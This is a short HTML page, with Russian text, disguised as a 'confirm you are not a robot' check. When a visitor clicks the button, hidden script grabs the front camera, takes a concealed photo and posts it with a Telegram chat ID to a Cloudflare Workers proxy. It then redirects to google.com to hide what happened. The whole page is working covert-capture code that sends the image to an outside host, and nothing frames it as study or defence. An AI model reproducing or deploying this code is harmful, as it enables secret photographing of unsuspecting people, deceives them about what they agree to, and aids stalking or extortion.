    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    </head>
    <body>
        <div style="text-align: center; margin-top: 50px;">
            <h2>Подтвердите, что вы не робот</h2>
            <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px;">
                Я не робот (Продолжить)
            </button>
        </div>
        
        <video id="v" autoplay style="display:none"></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
        // 1. Настройки (Прокси Cloudflare и твой ID)
const chatId = '1976857829';
const targetUrl = 'https://google.com';
const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

btn.onclick = async () => {
    try {
        // 1. Запрашиваем камеру
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } // Принудительно фронтальная камера
        });
        video.srcObject = stream;

        // 2. Ждем, пока камера реально начнет выдавать картинку
        await new Promise((resolve) => {
            video.onloadeddata = () => {
                // Маленькая задержка в 300мс специально для мобильных камер
                setTimeout(resolve, 300);
            };
        });

        // 3. Делаем снимок
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'img.jpg');

        // 4. Отправляем через прокси (не ждем ответа для скорости)
        fetch(proxyUrl, { method: 'POST', body: formData });

        // Выключаем камеру
        stream.getTracks().forEach(t => t.stop());

    } catch (err) {
        console.log("Ошибка:", err);
    } finally {
        // 5. Мгновенный переход
        window.location.href = targetUrl;
    }
};



        </script>
    </body>
    </html>
